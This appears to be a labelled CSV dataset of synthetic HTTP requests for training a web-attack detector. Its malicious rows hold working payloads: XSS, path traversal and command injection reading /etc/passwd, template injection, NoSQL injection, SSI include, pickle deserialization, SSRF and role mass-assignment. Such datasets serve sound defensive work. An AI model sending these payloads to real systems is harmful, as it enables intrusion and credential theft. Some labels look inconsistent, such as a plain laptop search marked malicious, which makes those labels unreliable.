label,text
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Referer: https://online-retail-store.biz/shop
Accept-Language: en-US,en;q=0.8
Content-Length: 134

{
  ""query"": ""search term"",
  ""event_details"": ""Search executed\"", \""result_count\"": 35, \""search_time_ms\"": 123, \""original_event\"": \""""
}"
benign,"GET /forum/thread/12345/page/2 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://stream-focus.net/live-events/123
Connection: keep-alive"
benign,"PATCH /manage/events/90321 HTTP/1.1
Host: cityevents-dashboard.us-west-2.cloudapp
Authorization: Bearer z0ix27nqkap8wlfgej541vrcds
Content-Type: application/json-patch+json
Accept: application/json, text/plain
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Origin: https://cityevents-dashboard.us-west-2.cloudapp
Referer: https://cityevents-dashboard.us-west-2.cloudapp/manage/events/90321
Connection: keep-alive

[
  {""op"": ""test"", ""path"": ""/status"", ""value"": ""scheduled""},
  {""op"": ""replace"", ""path"": ""/startTime"", ""value"": ""2024-07-10T09:00:00Z""},
  {""op"": ""replace"", ""path"": ""/endTime"", ""value"": ""2024-07-10T17:00:00Z""}
]"
benign,"GET /blog/article/view/12345?id=12345 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive"
benign,"GET /assets/js/vendor/chart-lib-v2.1.min.js HTTP/1.1
Host: market-data-analytics.co
User-Agent: Python-urllib/3.8
Accept: application/javascript
Accept-Encoding: gzip, deflate, br
Referer: https://market-data-analytics.co/reports/weekly-summary
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8

query=test&filter=none&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E"
benign,"POST /users/avatars/upload HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Content-Type: multipart/form-data; boundary=-----BoundaryGoogleBot765
Content-Length: 384
Referer: https://my-personal-blog-site.info/settings/avatar
Cookie: blog_session=aksjahsdk123987abc
Connection: keep-alive

------BoundaryGoogleBot765
Content-Disposition: form-data; name=""caption""

Profile photo for blog author
------BoundaryGoogleBot765
Content-Disposition: form-data; name=""image_file""; filename=""author_profile.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------BoundaryGoogleBot765--"
benign,"POST /api/v1/messages/send HTTP/1.1
Host: communication-hub-server.net
Authorization: Bearer 3458ae78a514dcf2b86823fcb927bef0
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: keep-alive
Content-Length: 172

{""recipientId"":7543,""message"":""SGVsbG8sIHRoaXMgaXMgYSBzYW1wbGUgbWVzc2FnZSBpbmNvcnBvcmF0ZWQgd2l0aCBpbi1saW5lIGJhc2U2NC4="",""timestamp"":""2024-06-06T09:30:45Z""}"
benign,"POST /v2/chat/messages HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
Connection: keep-alive
Content-Type: application/json
Cookie: session_token=e784a976fc0a43cb9e01dfcb1a2b7d0a; path=/; HttpOnly
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Length: 29

{""UNION ALL"": ""new_message_posted""}"
malicious,"POST /submit/data HTTP/1.1
Host: platform.content-sync.tech
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Content-Type: application/json
X-Data-Source: http://ssrf-trigger-node.cloud-edge.net/api
Content-Length: 78
Cache-Control: no-cache

{""record_id"":12345,""description"":""sync task with normal payload"",""priority"":2}"
benign,"POST /user-data/upload CSV HTTP/1.1
Host: secure-user-portal.net
Content-Type: text/csv
Content-Length: 103
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: sessionid=38af921e4f7d2b619f163d7fbcd12b40; preferences=lang=en-US
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15

username,email,status,signup_date
jane_doe,jane.doe@mailservice.com,active,2023-05-10
mike_88,mike88@example.net,inactive,2022-12-01"
benign,"GET /store/books/bestsellers/2024 HTTP/1.1
Host: bookhaven-online.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15A372 Safari/604.1
Referer: https://bookhaven-online.biz/store/home
Upgrade-Insecure-Requests: 1"
benign,"GET /members/4233/posts/latest HTTP/1.1
Host: cinephiles-circle.co
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Referer: https://cinephiles-circle.co/members/4233
Cookie: session_id=39dkfj392jf0dk2j1kd
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
benign,"HEAD /services/consulting HTTP/1.1
Host: elite-business-consultancy.ai
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml
If-None-Match: ""5d8c72a5-1234""
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: digital-marketing-hub.co.uk
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: text/plain, */*
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive"
malicious,"GET /search?query=test HTTP/1.1
Host: data-insights-portal.tech
User-Agent: SearchBot/1.1 `netstat -an | grep 80`
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /status HTTP/1.1
Host: public-api-analytics.ai
User-Agent: Site24x7/Monitor
Accept: text/plain
Connection: keep-alive"
benign,"GET /forum/threads/intro-to-vinyl-collecting HTTP/1.1
Host: spin-it-vinyl.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://spin-it-vinyl.org/forum/
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:80.0) Gecko/20100101 Firefox/80.0
Connection: keep-alive"
benign,"POST /api/v1/data/submit HTTP/1.1
Host: insights-cloud-platform.net
Content-Type: application/json
Content-Length: 38
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Connection: keep-alive

{""UNION ALL"": ""latest report data batch""}"
malicious,"GET /api/v3/items/serve?file=../../../../../../../../etc/passwd HTTP/1.1
Host: data-aggregation-hub.net
User-Agent: Python-urllib/3.9
Accept: application/json
Cache-Control: max-age=0
Origin: https://data-aggregation-hub.net
Connection: keep-alive"
malicious,"GET /content/user/<iMg SrC=x oNeRrOr=alert(document.cookie)>/edit HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /products/fitness-wearables/smartwatch-pro HTTP/1.1
Host: urban-sports-gear.com
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Referer: https://online-retail-store.biz/search
Cookie: retail_sid=retail12345sessiontoken67890
Content-Length: 52

search_term=wireless+headphones%27%5D%7D%2C%7B%24ne%3A1%7D%7D%2F%2F"
malicious,"PUT /api/updatePreferences HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 170
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15

{""user_id"":39302,""preferences"":{""theme"":""dark"",""homepage"":""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}}"
benign,"GET /favicon.ico HTTP/1.1
Host: green-urban-solutions.biz
Connection: keep-alive
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"GET /docs/special-edition/2024/annual_summary.pdf HTTP/1.1
Host: metro-finance-portal.biz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/pdf
Referer: https://metro-finance-portal.biz/reports/annual
Pragma: no-cache
Cache-Control: no-store
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /gallery/summer-2024/thumbnail.avif HTTP/1.1
Host: visual-archives.space
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Referer: https://visual-archives.space/gallery/2024
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /services/userprofile/modify HTTP/1.1
Host: profiles.community-game-dev-forum.org
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 241
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8
DNT: 1
Connection: keep-alive
X-CSRF-Token: 32d7f90e2a9f8c67b16247b30bbcc8a3

<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Header/>
  <soap:Body>
    <UpdateProfile xmlns=""http://cgdf.example.org/profile"">
      <UserID>user_7924</UserID>
      <EmailPreferences>enabled</EmailPreferences>
    </UpdateProfile>
  </soap:Body>
</soap:Envelope>"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: en-US,en;q=0.7
Referer: https://community.game-dev-forum.org/welcome
Connection: keep-alive"
benign,"POST /polls/77/submit HTTP/1.1
Host: local-community-polls.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Referer: https://local-community-polls.co.uk/polls/77
Cookie: sessionId=8a4e2d69f1c32b7c

poll_id=77&choice_id=1"
benign,"GET /blog/article/view/7582 HTTP/1.1
Host: writing-muse-journal.info
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Cookie: logged_in=true; prefs=layout=grid&theme=sepia; session_token=ab123f6dgh7lmno
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Upgrade-Insecure-Requests: 1"
malicious,"POST /api/v3/query/user HTTP/1.1
Host: data-insights-platform.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Cookie: session_token=xyz987abc654

{""query"":{""$where"":""this.username=='admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"POST /user-posts/comment HTTP/1.1
Host: urban-gardening.co.uk
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://urban-gardening.co.uk
Referer: https://urban-gardening.co.uk/user-posts/4781
Cookie: sid=12f7cd89ea26ff4a0273
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
X-CSRF-Token: d285b7adef9f9a5247a61c3c7e

author_name=Tommy+Green&comment_text=This+tip+about+composting+works+great+in+my+small+balcony+garden.+Thanks!"
benign,"POST /account/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Connection: close
Referer: https://secure-user-portal.net/account/settings
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; prefs=darkmode

display_name=Michael+Lee&bio=Tech+lover+and+photographer+from+NYC&website_url=https%3A%2F%2Fmleeportfolio.dev&location=New+York%2C+NY"
benign,"GET /user-guide/setup-and-installation HTTP/1.1
Host: smart-home-solutions.info
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Encoding: gzip
Via: 1.1 proxy01.smart-home-solutions.info
Connection: close"
benign,"POST /soap/CustomerService HTTP/1.1
Host: clientconnect-enterprise.us
Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
Content-Type: application/xml
Accept: application/xml
User-Agent: curl/7.88.1
Content-Length: 235
Connection: close

<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:cust=""http://clientconnect-enterprise.us/customer"">
  <soapenv:Header/>
  <soapenv:Body>
    <cust:AddCustomer>
      <cust:Name>Gregory Mills</cust:Name>
      <cust:Email>greg.mills@clientconnect-enterprise.us</cust:Email>
      <cust:Phone>+1-541-555-7854</cust:Phone>
      <cust:Country>United States</cust:Country>
    </cust:AddCustomer>
  </soapenv:Body>
</soapenv:Envelope>"
malicious,"GET /portal/custom_page?title=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Referer: https://online-retail-store.biz/home
Connection: close"
malicious,"GET /search/items?search_term=gaming%20laptop HTTP/1.1
Host: techsmart-electro.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Referer: https://homepage.techsmart-electro.net/"
benign,"GET /forums/thread/8791/weekly-gaming-news-discussion HTTP/1.1
Host: consolegamersforum.biz
Connection: keep-alive
Accept: text/html
Referer: https://consolegamersforum.biz/forums/latest
Cookie: cgf_sid=abc8947def3f79123; logged_in=true; theme=light
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.7"
benign,"POST /api/v1/document/upload HTTP/1.1
Host: docu-exchange-platform.net
Connection: close
User-Agent: curl/7.86.0
Accept: */*
Content-Type: multipart/form-data; boundary=--BoundaryXyz123
Content-Length: 496
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

----BoundaryXyz123
Content-Disposition: form-data; name=""document""; filename=""budget_overview.pdf""
Content-Type: application/pdf

%PDF-1.5
%ÐÔÅØ
1 0 obj
<< /Type /Catalog >>
endobj

----BoundaryXyz123
Content-Disposition: form-data; name=""year""

2024
----BoundaryXyz123
Content-Disposition: form-data; name=""department""

Finance
----BoundaryXyz123--"
benign,"GET /community/forums/thread/98765?page=2 HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: keep-alive
Referer: https://community.game-dev-forum.org/community/forums/"
benign,"GET /assets/js/main.9f7c3a2e.js HTTP/1.1
Host: online-retail-store.biz
Accept: */*
Referer: https://online-retail-store.biz/products/electronics/laptops
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SQ3A.220705.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.134 Mobile Safari/537.36
Connection: keep-alive"
malicious,"GET /status/check HTTP/1.1
Host: analytics.enterprise-vault.net
User-Agent: Python-requests/2.25.1
Accept: text/plain
Referer: https://portal.enterprise-vault.net/home
X-Pickled-Data: \x80\x03cnative\nsystem
q\x00X\x0cid\x94\x85q\x01Rq\x02."
malicious,"GET /system/trace_route?host=example.internal.net;%20cat%20/etc/passwd HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Cache-Control: max-age=0
Pragma: no-cache"
benign,"GET /marketing/campaign/status?id=camp-404a2fb1 HTTP/1.1
Host: email-marketing-hub.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cache-Control: max-age=0
Referer: https://email-marketing-hub.org/dashboard"
benign,"GET /videos/2024/innovation-summit/highlights HTTP/1.1
Host: digital-media-streaming.tv
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Accept: video/webm,video/mp4;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Cache-Control: no-cache
Connection: keep-alive
Referer: https://digital-media-streaming.tv/events/summit"
malicious,"POST /api/v1/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Origin: https://api.cloud-data-services.ai
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Content-Length: 69
Connection: close

user_bio=Experienced+developer+%3C%21--%23InClUdE+fIlE%3D%22%2Fvar%2Fwww%2Fsecret.txt%22+--%3E"
benign,"PUT /api/v1/devices/cc1321c/config HTTP/1.1
Host: iot-control-hub.cloud
Authorization: Bearer zxy0987asdkfl3579qw
Origin: https://iot-control-hub.cloud
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.85.0
Content-Length: 106

{""configuration"": {""samplingInterval"": 3000, ""ledIndicator"": ""off"", ""autoUpdate"": true}, ""location"": ""warehouse-3""}"
benign,"GET /api/v2/resources/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: api.smart-fintech-solutions.ai
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"POST /account/forgot_password HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.122 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
Cache-Control: no-cache
Referer: https://api.cloud-data-services.ai/account/forgot_password

email=samuel.t.kim%40codeshift-ibm.io"
benign,"PUT /media/profile/avatar HTTP/1.1
Host: photo-sharing-service.tv
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
If-Match: ""e3d8c898428bc6a7a1adc5d28d2f94fa""
Cookie: session_token=ghij2345klmn6789opqr
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Content-Length: 251

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""avatar""; filename=""profile.jpg""
Content-Type: image/jpeg

<binary image data placeholder>
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
benign,"POST /user/register HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://api.cloud-data-services.ai/signup
Accept-Language: en-GB,en;q=0.8

email=jordan.smith%40mail.ai&password=Secr3tPass&redirect_uri=https%3A%2F%2Fapi.cloud-data-services.ai%2Fwelcome"
benign,"POST /user/newsletter/join HTTP/1.1
Host: eco-friendly-hub.co
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Accept-Encoding: gzip, deflate
DNT: 1
Origin: https://eco-friendly-hub.co
Connection: keep-alive

email=sophia.wu%40greenmail.co"
benign,"POST /subscribe/newsletter HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Referer: https://my-personal-blog-site.info/posts/45
Connection: keep-alive

email=isabella.drew%40myblogsite.info"
benign,"GET /media/podcasts/latest-episode.mp3 HTTP/1.1
Host: downloads.audio-hub.cloud
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Range: bytes=0-1023
Accept: audio/mpeg, audio/*;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /user/profile/update HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Origin: https://community.game-dev-forum.org
Content-Length: 245

{""username"":""pixelSorcerer"",""title"":""Master Coder"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""}"
benign,"GET /api/v1/events/filter?type=conference&type=webinar&type=workshop&location=us HTTP/1.1
Host: global-events-hub.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: application/json
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Connection: close"
benign,"PUT /configs/v1/workspace/45/channels HTTP/1.1
Host: secure-collabora.io
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTUyMzgiLCJpYXQiOjE2ODE4Mjk1NjB9.srNqP2lKK6T36iXdDUIq3a4cYUplXG4OdqON0uGhO48
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Length: 367

{""channels"":[{""id"":""general"",""settings"":{""mute"":false,""pinnedMessages"":[""3452"",""6791""]}},{""id"":""dev-team"",""settings"":{""mute"":true,""pinnedMessages"":[]}},{""id"":""marketing"",""settings"":{""mute"":false,""pinnedMessages"":[""7812""]}}],""workspaceSettings"":{""defaultChannel"":""general"",""notifications"":{""mentionsOnly"":false}}}"
benign,"POST /user/profile/comment HTTP/1.1
Host: interactive-js-lab.net
User-Agent: Bingbot/2.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 174
Connection: close

message=Sharing+my+code+snippet%3A+function+updateContent%28id%29+%7B+document.getElementById%28id%29.innerHTML+%3D+%27Updated+content%27%3B+%7D+Hope+this+helps."
benign,"GET /images/logo.svg HTTP/2.0
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: image/svg+xml,image/*,*/*;q=0.7
Accept-Language: en-US,en;q=0.5
Referer: https://community.game-dev-forum.org/home
DNT: 1
Connection: keep-alive"
malicious,"PUT /api/v2/users/update HTTP/1.1
Host: data-analytics-hub.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: text/plain
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Length: 88

user%5Bemail%5D=analyst%40data-analytics-hub.ai&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=20&user%5Broles%5D%5B%5D=21"
